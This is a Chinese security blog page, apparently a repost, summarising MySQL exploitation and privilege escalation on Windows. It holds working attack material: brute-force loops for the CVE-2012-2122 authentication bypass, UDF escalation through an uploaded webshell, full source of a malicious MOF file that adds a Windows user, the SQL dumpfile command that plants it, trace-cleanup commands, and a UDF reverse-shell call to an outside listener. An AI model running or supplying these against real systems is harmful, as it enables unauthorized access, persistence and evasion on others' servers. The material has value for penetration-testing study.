@@ -1,0 +1,666 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="chrome=1">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+    
+
+    <title>mysql数据库漏洞利用及提权方式小结(转) | 2h0nG&#39;s Blog</title>
+    <meta name="author" content="John Doe">
+    
+    <meta name="description" content="Love is friendship fell into love">
+    
+    
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+    <meta property="og:title" content="mysql数据库漏洞利用及提权方式小结(转)"/>
+    <meta property="og:site_name" content="2h0nG&#39;s Blog"/>
+
+    
+    <meta property="og:image" content=""/>
+    
+
+    <link rel="icon" type="image/png" href="/favicon.png">
+    <link rel="alternate" href="/atom.xml" title="2h0nG&#39;s Blog" type="application/atom+xml">
+    <link rel="stylesheet" href="/css/lib/materialize.min.css">
+    <link rel="stylesheet" href="/css/lib/font-awesome.min.css">
+    <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+
+    
+        <link rel="stylesheet" href="/css/lib/prettify-tomorrow-night-eighties.css" type="text/css">
+    
+    <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+<meta name="generator" content="Hexo 5.0.0"></head>
+
+
+<body>
+    <img src="/weixin_favicon.png" style="position: absolute; left: -9999px; opacity: 0; filter: alpha(opacity=0);">
+
+    <nav class="indigo">
+    <div class="nav-wrapper">
+        <a href="#" data-activates="main-menu" class="button-collapse">
+            <i class="fa fa-navicon"></i>
+        </a>
+        <div class="">
+            <a href="/" class="brand-logo hide-on-med-and-down">2h0nG&#39;s Blog</a>
+            <ul class="right hide-on-med-and-down">
+                
+                    <li>
+                        <a class="menu-home " href="/" >
+                            <i class="fa fa-home "></i>
+                            
+                            首页
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a class="menu-archive " href="/archives" >
+                            <i class="fa fa-archive "></i>
+                            
+                            归档
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a class="menu-category category-menu" href="javascript:;" data-activates="category-menu" >
+                            <i class="fa fa-bookmark "></i>
+                            
+                            分类
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a class="menu-reading " href="/reading" >
+                            <i class="fa fa-book "></i>
+                            
+                            读书
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a class="menu-about " href="/about" >
+                            <i class="fa fa-user "></i>
+                            
+                            关于
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a class="menu-search modal-trigger " href="#search" >
+                            <i class="fa fa-search "></i>
+                            
+                            搜索
+                        </a>
+                    </li>
+                
+            </ul>
+            <div>
+    <ul class="side-nav indigo darken-1" id="main-menu">
+        
+        <li class="side-user">
+            <div class="row">
+                <div class="col s4 no-padding">
+                    <img class="avatar-image circle responsive-img" src="http://ww2.sinaimg.cn/small/74990035jw1f1rjkd681bj20rs0rsdhg.jpg" alt="User Avatar">
+                </div>
+                <div class="info col s8 valign-wrapper no-padding">
+                    <div class="valign">
+                        <p class="name">2h0nG</p>
+                        <p class="desc">不断学习中</p>
+                    </div>
+                </div>
+            </div>
+        </li>
+        
+
+        
+            <li class="no-padding">
+                <a class="waves-effect menu-home " href="/" >
+                    <i class="fa fa-home "></i>
+                    
+                    首页
+                </a>
+            </li>
+        
+            <li class="no-padding">
+                <a class="waves-effect menu-archive " href="/archives" >
+                    <i class="fa fa-archive "></i>
+                    
+                    归档
+                </a>
+            </li>
+        
+            <li class="no-padding">
+                <a class="waves-effect menu-category category-menu" href="javascript:;" data-activates="category-menu" >
+                    <i class="fa fa-bookmark "></i>
+                    
+                    分类
+                </a>
+            </li>
+        
+            <li class="no-padding">
+                <a class="waves-effect menu-reading " href="/reading" >
+                    <i class="fa fa-book "></i>
+                    
+                    读书
+                </a>
+            </li>
+        
+            <li class="no-padding">
+                <a class="waves-effect menu-about " href="/about" >
+                    <i class="fa fa-user "></i>
+                    
+                    关于
+                </a>
+            </li>
+        
+            <li class="no-padding">
+                <a class="waves-effect menu-search modal-trigger " href="#search" >
+                    <i class="fa fa-search "></i>
+                    
+                    搜索
+                </a>
+            </li>
+        
+    </ul>
+
+    <ul class="side-nav indigo darken-1" id="category-menu">
+    
+
+            
+
+            <li class="collapse-level-0" collapse-level="0">
+                <a class="no-padding" href="/categories/数据通信安全/">
+                    数据通信安全 <span class="right">30 篇</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-0" collapse-level="0">
+                <a class="no-padding" href="/categories/代码审计安全/">
+                    代码审计安全 <span class="right">10 篇</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-0" collapse-level="0">
+                <a class="no-padding" href="/categories/Linux系统安全/">
+                    Linux系统安全 <span class="right">12 篇</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-0" collapse-level="0">
+                <a class="no-padding" href="/categories/Web渗透测试/">
+                    Web渗透测试 <span class="right">26 篇</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-0" collapse-level="0">
+                <a class="no-padding" href="/categories/CTF笔记/">
+                    CTF笔记 <span class="right">16 篇</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-0" collapse-level="0">
+                <a class="no-padding" href="/categories/Python学习/">
+                    Python学习 <span class="right">3 篇</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-0" collapse-level="0">
+                <a class="no-padding" href="/categories/Leetcode题解/">
+                    Leetcode题解 <span class="right">24 篇</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-0" collapse-level="0">
+                <a class="no-padding" href="/categories/漏洞复现与分析/">
+                    漏洞复现与分析 <span class="right">1 篇</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-0" collapse-level="0">
+                <a class="no-padding" href="/categories/数据恢复/">
+                    数据恢复 <span class="right">2 篇</span></a>
+                </a>
+            </li>
+
+        
+
+    </ul>
+</div>
+
+        </div>
+    </div>
+</nav>
+
+<div id="search" class="modal search-modal">
+    <div class="row">
+        <div class="input-field col s12">
+              <input id="search-input" type="text">
+              <label for="search-input">搜索</label>
+        </div>
+
+    </div>
+    <div id="search-result" class="search-result col s12">
+
+    </div>
+</div>
+
+
+    <main>
+        <div class="container main-container">
+    <nav class="page-nav hide-on-small-only">
+    <div class="nav-wrapper indigo">
+        <span class="breadcrumb">当前位置（分类目录）</span>
+        
+            
+    
+    
+    <a class="breadcrumb" href="/categories/Web渗透测试/">Web渗透测试</a>
+
+
+        
+
+        
+    </div>
+</nav>
+
+<article>
+    <div class="card">
+        <div class="card-content">
+            
+
+            <div class="article-title">
+                
+    
+        <h1>mysql数据库漏洞利用及提权方式小结(转)</h1>
+    
+
+
+            </div>
+            <time class="pink-link-context" datetime="2020-10-27T13:03:04.117Z"><a href="/2020/10/27/%E9%98%B6%E6%AE%B5%E5%9B%9B%E3%80%81Web%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%8F%8A%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E5%B0%8F%E7%BB%93(%E8%BD%AC)/">2020-10-27</a></time>
+
+            <span id="busuanzi_container_page_pv" class="read-times-container">
+    <i class="fa fa-eye"></i>
+    <span id="busuanzi_value_page_pv"></span>
+</span>
+
+            
+    <div class="tags-row">
+        
+            <a href="/tags/Web渗透测试/" class="chip pink lighten-1">Web渗透测试</a>
+        
+    </div>
+
+
+            <div class="toc pink-link-context hide-on-med-and-down">
+    <ol class="section table-of-contents"><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#CVE-2012-2122-Mysql%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E6%BC%8F%E6%B4%9E"><span class="section table-of-contents-text">CVE-2012-2122 Mysql身份认证漏洞</span></a><ol class="section table-of-contents-child"><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC"><span class="section table-of-contents-text">影响版本</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="section table-of-contents-text">漏洞原理</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="section table-of-contents-text">漏洞复现</span></a><ol class="section table-of-contents-child"><li class="section table-of-contents-item section table-of-contents-level-4"><a class="section table-of-contents-link" href="#msf%E5%88%A9%E7%94%A8"><span class="section table-of-contents-text">msf利用</span></a></li><li class="section table-of-contents-item section table-of-contents-level-4"><a class="section table-of-contents-link" href="#python-exp"><span class="section table-of-contents-text">python exp</span></a></li><li class="section table-of-contents-item section table-of-contents-level-4"><a class="section table-of-contents-link" href="#shell-exp"><span class="section table-of-contents-text">shell exp</span></a></li></ol></li></ol></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#Mysql-UDF%E6%8F%90%E6%9D%83"><span class="section table-of-contents-text">Mysql UDF提权</span></a><ol class="section table-of-contents-child"><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#%E5%88%A9%E7%94%A8sqlmap%E8%BF%9B%E8%A1%8CUDF%E6%8F%90%E6%9D%83"><span class="section table-of-contents-text">利用sqlmap进行UDF提权</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#%E5%88%A9%E7%94%A8msf%E8%BF%9B%E8%A1%8CUDF%E6%8F%90%E6%9D%83"><span class="section table-of-contents-text">利用msf进行UDF提权</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#%E6%89%8B%E5%B7%A5UDF%E6%8F%90%E6%9D%83"><span class="section table-of-contents-text">手工UDF提权</span></a></li></ol></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#Mysql-MOF%E6%8F%90%E6%9D%83"><span class="section table-of-contents-text">Mysql MOF提权</span></a><ol class="section table-of-contents-child"><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#%E7%9B%B4%E6%8E%A5%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6MOF%E6%8F%90%E6%9D%83"><span class="section table-of-contents-text">直接上传文件MOF提权</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#%E5%88%A9%E7%94%A8msf%E8%BF%9B%E8%A1%8CMOF%E6%8F%90%E6%9D%83"><span class="section table-of-contents-text">利用msf进行MOF提权</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#%E4%B8%8A%E4%BC%A0nullevt-mof%E6%96%87%E4%BB%B6%E8%BF%9B%E8%A1%8CMOF%E6%8F%90%E6%9D%83"><span class="section table-of-contents-text">上传nullevt.mof文件进行MOF提权</span></a></li></ol></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#Mysql%E5%8F%8D%E5%BC%B9%E7%AB%AF%E5%8F%A3%E6%8F%90%E6%9D%83"><span class="section table-of-contents-text">Mysql反弹端口提权</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="section table-of-contents-text">参考链接</span></a></li></ol>
+</div>
+
+
+            <div class="entry pink-link-context">
+                <h2 id="CVE-2012-2122-Mysql身份认证漏洞"><a href="#CVE-2012-2122-Mysql身份认证漏洞" class="headerlink" title="CVE-2012-2122 Mysql身份认证漏洞"></a>CVE-2012-2122 Mysql身份认证漏洞</h2><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p><code>Mysql</code>在<code>5.5.24</code>之前<br><code>MariaDB</code>也差不多这个版本之前</p>
+<h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>只要知道用户名，不断尝试就能够直接登入<code>SQL</code>数据库，按照公告说法大约<code>256</code>次就能够蒙对一次</p>
+<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><h4 id="msf利用"><a href="#msf利用" class="headerlink" title="msf利用"></a>msf利用</h4><p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20200313113908-320daaca-64dc-1.jpg"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200313113908-320daaca-64dc-1.jpg" alt="img"></a><br>hash解密<br><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20200313113908-321d9818-64dc-1.jpg"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200313113908-321d9818-64dc-1.jpg" alt="img"></a><br>得到密码即可登录<br><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20200313113908-322a8528-64dc-1.jpg"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200313113908-322a8528-64dc-1.jpg" alt="img"></a></p>
+<h4 id="python-exp"><a href="#python-exp" class="headerlink" title="python exp"></a>python exp</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python</span><br><span class="line">import subprocess</span><br><span class="line"></span><br><span class="line">while 1:</span><br><span class="line">        subprocess.Popen(&quot;mysql -u root -p -h 192.168.0.16 --password&#x3D;test&quot;, shell&#x3D;True).wait()</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20200313113908-325c281c-64dc-1.jpg"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200313113908-325c281c-64dc-1.jpg" alt="img"></a></p>
+<h4 id="shell-exp"><a href="#shell-exp" class="headerlink" title="shell exp"></a>shell exp</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for i in &#96;seq 1 1000&#96;; do mysql -u root -p -h 192.168.0.16 --password&#x3D;bad 2&gt;&#x2F;dev&#x2F;null; done</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20200313113909-32726852-64dc-1.jpg"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200313113909-32726852-64dc-1.jpg" alt="img"></a></p>
+<h2 id="Mysql-UDF提权"><a href="#Mysql-UDF提权" class="headerlink" title="Mysql UDF提权"></a>Mysql UDF提权</h2><p>如果mysql版本大于5.1，udf.dll文件必须放置在mysql安装目录的lib\plugin文件夹下<br>如果mysql版本小于5.1，udf.dll文件在windows server 2003下放置于c:\windows\system32目录，在windows server 2000下放置在c:\winnt\system32目录</p>
+<h3 id="利用sqlmap进行UDF提权"><a href="#利用sqlmap进行UDF提权" class="headerlink" title="利用sqlmap进行UDF提权"></a>利用sqlmap进行UDF提权</h3><p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20200313113909-32a644d8-64dc-1.jpg"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200313113909-32a644d8-64dc-1.jpg" alt="img"></a></p>
+<h3 id="利用msf进行UDF提权"><a href="#利用msf进行UDF提权" class="headerlink" title="利用msf进行UDF提权"></a>利用msf进行UDF提权</h3><p>使用mysql_udf_payload模块<br>适应于5.5.9以下，我这边的mysql版本号为5.5.53，已经超出了版本限制，所以不能提权</p>
+<h3 id="手工UDF提权"><a href="#手工UDF提权" class="headerlink" title="手工UDF提权"></a>手工UDF提权</h3><p>这里上传使用暗月的木马<br><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20200313113909-32c00d28-64dc-1.jpg"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200313113909-32c00d28-64dc-1.jpg" alt="img"></a><br>这作者牛逼牛逼<br>登录进去，它会自动判断<code>mysql</code>版本决定出导出<code>dll</code>文件位置<br><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20200313113909-32e34fe0-64dc-1.jpg"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200313113909-32e34fe0-64dc-1.jpg" alt="img"></a><br>然后导出<code>udf</code>，发现没有<code>plugin</code>这个目录<br><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20200313113909-32f81c72-64dc-1.jpg"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200313113909-32f81c72-64dc-1.jpg" alt="img"></a><br>于是我们创建后就能成功导出<br><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20200313113909-3302fd36-64dc-1.jpg"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200313113909-3302fd36-64dc-1.jpg" alt="img"></a><br>但是一直找不到文件。。，<br>最后使用其它的<code>udf</code>提权文件发现可以，原来是这个<code>udf</code>文件问题，这下便能执行命令<br><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20200313113910-3315d9c4-64dc-1.jpg"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200313113910-3315d9c4-64dc-1.jpg" alt="img"></a><br>添加管理员，开启<code>3389</code>等。。这里就略过<br>既然知道了<code>mysql</code>账号密码当然也可以直接连接上去，然后上传文件，执行命令</p>
+<h2 id="Mysql-MOF提权"><a href="#Mysql-MOF提权" class="headerlink" title="Mysql MOF提权"></a>Mysql MOF提权</h2><h3 id="直接上传文件MOF提权"><a href="#直接上传文件MOF提权" class="headerlink" title="直接上传文件MOF提权"></a>直接上传文件MOF提权</h3><p>直接上传<code>mof.php</code>文件登录后执行任意命令<br><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20200313113910-33217914-64dc-1.jpg"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200313113910-33217914-64dc-1.jpg" alt="img"></a><br><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20200313113910-3334d842-64dc-1.jpg"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200313113910-3334d842-64dc-1.jpg" alt="img"></a></p>
+<h3 id="利用msf进行MOF提权"><a href="#利用msf进行MOF提权" class="headerlink" title="利用msf进行MOF提权"></a>利用msf进行MOF提权</h3><p>使用<code>mysql_mof</code>模块，有的版本不能成功，比如我现在这个<code>phpstudy</code>搭建的<code>5.5.53</code></p>
+<h3 id="上传nullevt-mof文件进行MOF提权"><a href="#上传nullevt-mof文件进行MOF提权" class="headerlink" title="上传nullevt.mof文件进行MOF提权"></a>上传nullevt.mof文件进行MOF提权</h3><p>nullevt.mof文件源码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#pragma namespace(&quot;\\\\.\\root\\subscription&quot;)</span><br><span class="line">instance of __EventFilter as $EventFilter</span><br><span class="line">&#123;</span><br><span class="line">EventNamespace &#x3D; &quot;Root\\Cimv2&quot;;</span><br><span class="line">Name &#x3D; &quot;filtP2&quot;;</span><br><span class="line">Query &#x3D; &quot;Select * From __InstanceModificationEvent &quot;</span><br><span class="line">&quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot;</span><br><span class="line">&quot;And TargetInstance.Second &#x3D; 5&quot;;</span><br><span class="line">QueryLanguage &#x3D; &quot;WQL&quot;;</span><br><span class="line">&#125;;</span><br><span class="line">instance of ActiveScriptEventConsumer as $Consumer</span><br><span class="line">&#123;</span><br><span class="line">Name &#x3D; &quot;consPCSV2&quot;;</span><br><span class="line">ScriptingEngine &#x3D; &quot;JScript&quot;;</span><br><span class="line">ScriptText &#x3D;</span><br><span class="line">&quot;var WSH &#x3D; new ActiveXObject(\&quot;WScript.Shell\&quot;)\nWSH.run(\&quot;net.exe user ghtwf011 ghtwf01 &#x2F;add\&quot;)&quot;;</span><br><span class="line">&#125;;</span><br><span class="line">instance of __FilterToConsumerBinding</span><br><span class="line">&#123;</span><br><span class="line">Consumer &#x3D; $Consumer;</span><br><span class="line">Filter &#x3D; $EventFilter;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>他会每五秒创建一个账户<code>ghtwf011</code>，里面命令可以自定义<br>使用sql语句将文件导入到<code>c:/windows/system32/wbem/mof/</code>下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(&quot;C:&#x2F;phpstudy&#x2F;WWW&#x2F;nullevt.mof&quot;) into dumpfile &quot;c:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F;nullevt.mof&quot;</span><br></pre></td></tr></table></figure>
+
+<p>注意这里不能使用<code>outfile</code>，因为会在末端写入新行，因此<code>mof</code>在被当作二进制文件无法正常执行，所以我们用<code>dumpfile</code>导出一行数据<br><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20200313113910-33441b68-64dc-1.jpg"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200313113910-33441b68-64dc-1.jpg" alt="img"></a><br>成功生成了<code>ghtwf011</code>账户<br><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20200313113910-33512fb0-64dc-1.jpg"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200313113910-33512fb0-64dc-1.jpg" alt="img"></a><br>因为每五秒都会生成账户，痕迹清理的时候使用如下办法即可</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">net stop winmgmt</span><br><span class="line">net user ghtwf011 &#x2F;delete</span><br><span class="line">切换到c:&#x2F;windows&#x2F;system32&#x2F;wbem后del repository</span><br><span class="line">net start winmgmt</span><br></pre></td></tr></table></figure>
+
+<h2 id="Mysql反弹端口提权"><a href="#Mysql反弹端口提权" class="headerlink" title="Mysql反弹端口提权"></a>Mysql反弹端口提权</h2><p>原理就是声明一个<code>backdoor</code>函数<br>exp如下，exp太长了文章发不出来。。我附件出来吧</p>
+<p>第二条定义的<code>@a</code>是<code>udf.dll</code>内容的<code>16</code>进制<br>依次执行命令<br><code>kali</code>使用<code>nc</code>监听，这边执行<code>select backshell(&quot;192.168.0.12&quot;,4444);</code><br><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20200313113910-335a3e70-64dc-1.jpg"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200313113910-335a3e70-64dc-1.jpg" alt="img"></a><br><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20200313113910-3365540e-64dc-1.jpg"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200313113910-3365540e-64dc-1.jpg" alt="img"></a><br>成功提权拿到<code>shell</code></p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/3815.html">https://www.freebuf.com/vuls/3815.html</a><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2719#toc-14">https://xz.aliyun.com/t/2719#toc-14</a></p>
+
+                
+<p class="pink-link-context">
+    <a href="/2020/10/27/%E9%98%B6%E6%AE%B5%E5%9B%9B%E3%80%81Web%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/msfvenom%E5%90%84%E5%B9%B3%E5%8F%B0%E6%9C%A8%E9%A9%AC%E7%94%9F%E6%88%90/" rel="next" title="msfvenom各平台木马生成(转)">
+    上一篇：msfvenom各平台木马生成(转)
+  </a>
+</p>
+
+
+
+<p class="pink-link-context">
+    <a href="/2020/10/27/%E9%98%B6%E6%AE%B5%E5%9B%9B%E3%80%81Web%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%AF%B9MYSQL%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E5%86%85%E5%AE%B9%E5%8F%8A%E9%83%A8%E5%88%86Trick%E7%9A%84%E5%BD%92%E7%B1%BB(%E8%BD%AC)/" rel="next" title="对MYSQL注入相关内容及部分Trick的归类（转）">
+    下一篇：对MYSQL注入相关内容及部分Trick的归类（转）
+  </a>
+</p>
+
+
+            </div>
+			
+        </div>
+    </div>
+</article>
+
+
+
+
+
+
+</div>
+
+        <div class="fixed-action-btn float-sitemap">
+    <a class="btn-floating btn-large pink">
+      <i class="fa fa-caret-square-o-up"></i>
+    </a>
+    <ul>
+      <li><a class="btn-return-top btn-floating waves-effect green" title="回到顶部"><i class="fa fa-arrow-circle-o-up"></i></a></li>
+      <li><a class="btn-floating waves-effect button-collapse yellow darken-1"  data-activates="main-menu" title="菜单"><i class="fa fa-navicon"></i></a></li>
+    </ul>
+  </div>
+
+    </main>
+    <footer class="page-footer indigo darken-1">
+    
+    <div class="footer-container container">
+        <div class="row">
+            
+            <div class="social-group col m4 s12">
+                <h5 class="white-text">社交</h5>
+                
+                    <a class="social-link" href="http://weibo.com/1956184117" target="_blank">
+                        <i class="fa fa-2x fa-weibo"></i>
+                    </a>
+                
+                    <a class="social-link" href="https://github.com/raytaylorlin" target="_blank">
+                        <i class="fa fa-2x fa-github"></i>
+                    </a>
+                
+                    <a class="social-link" href="/atom.xml" target="_blank">
+                        <i class="fa fa-2x fa-rss"></i>
+                    </a>
+                
+                
+
+            </div>
+            
+
+            
+            <div class="col m8 s12">
+                <h5 class="white-text">友情链接</h5>
+                
+                    <a class="social-link" href="http://raytaylorlin.com/" target="_blank">raytaylorism主题作者的技术博客</a>
+                
+                    <a class="social-link" href="https://github.com/raytaylorlin" target="_blank">Github地址（测试友情链接）</a>
+                
+            </div>
+            
+        </div>
+    </div>
+    
+
+    <div class="footer-copyright pink-link-context">
+        <div class="container">
+            © 2016 example.com, All rights reserved.
+            <p class="right" style="margin-top: 0;">本博客由 <a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a> 强力驱动 | 主题 <a target="_blank" rel="noopener" href="https://github.com/raytaylorlin/hexo-theme-raytaylorism">raytaylorism</a></p>
+        </div>
+    </div>
+</footer>
+
+
+    <noscript>
+    <div class="noscript">
+        <p class="center-align">当前网速较慢或者你使用的浏览器不支持博客特定功能，请尝试刷新或换用Chrome、Firefox等现代浏览器</p>
+    </div>
+</noscript>
+<div class="noscript">
+    <p class="center-align">当前网速较慢或者你使用的浏览器不支持博客特定功能，请尝试刷新或换用Chrome、Firefox等现代浏览器</p>
+</div>
+
+
+<script src="/js/jquery.min.js"></script>
+<script src="/js/materialize.min.js"></script>
+
+<script>
+    (function($) {
+        $(document).ready(function() {
+            // 隐藏禁用javascript（针对微信内置浏览器）的提示
+            $('.noscript').hide();
+
+            // 图片缩放效果
+            var $imgs = $('img').not('.slider-image').not('.avatar-image').not('.carousel-image').not('.card-cover-image').not('.qrcode');
+
+            // 给图片加上点击放大效果（materialbox插件）
+            $imgs.addClass('materialboxed').each(function(i, el) {
+                $(this).attr('data-caption', $(this).attr('alt') || ' ');
+            }).materialbox();
+
+            // 优化表格的显示
+            $('table').each(function() {
+                var $table = $(this);
+                // 除去多行代码的情况
+                if ($table.find('pre').length == 0) {
+                    $table.addClass('responsive-table striped bordered');
+                }
+            });
+
+            // 首页幻灯片
+            $('.slider').slider({indicators: true, full_width: true, interval: 8000});
+
+            $(".button-collapse").sideNav();
+            $(".category-menu").sideNav();
+
+            // 针对gallery post
+            $('.carousel').carousel({full_width: true});
+            $('.carousel-control.prev').click(function() {
+                $('.carousel').carousel('prev');
+            });
+            $('.carousel-control.next').click(function() {
+                $('.carousel').carousel('next');
+            });
+
+            // 文章目录
+            $('article').not('.simple-article').find('h1').add('h2').add('h3').add('h4').add('h5').add('h6').scrollSpy();
+
+            // 目录随屏幕滚动（防止目录过长越过footer）
+            var $toc = $('.toc');
+            var scrollTargetTop = 0;
+            $(window).scroll(function() {
+                var $activeLink = $toc.find('a.active.section');
+                if ($(window).scrollTop() < 100) {
+                    scrollTargetTop = 0;
+                } else {
+                    if ($activeLink[0]) {
+                        scrollTargetTop = $activeLink.offset().top - $toc.offset().top;
+                    }
+                }
+                $toc.css('top', '-' + scrollTargetTop + 'px');
+            });
+
+            // 修正文章目录的left-border颜色
+            var color = $('.table-of-contents-text').css('color');
+            $('.table-of-contents-link').css('border-left-color', color);
+
+            // 针对移动端做的优化：FAB按钮点击一下收回
+            if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
+                $('.fixed-action-btn').addClass('click-to-toggle');
+            }
+            // 回到顶部
+            $('.btn-return-top').click(function() {
+                $('body, html').animate({
+                    scrollTop: 0
+                }, 500);
+            });
+
+            // 重置读书页面的Tab标签页的颜色
+            $('li.tab a').hover(function() {
+                $(this).toggleClass('text-lighten-4');
+            });
+            $('.indicator').addClass('pink lighten-2');
+
+            
+            // 添加new标签
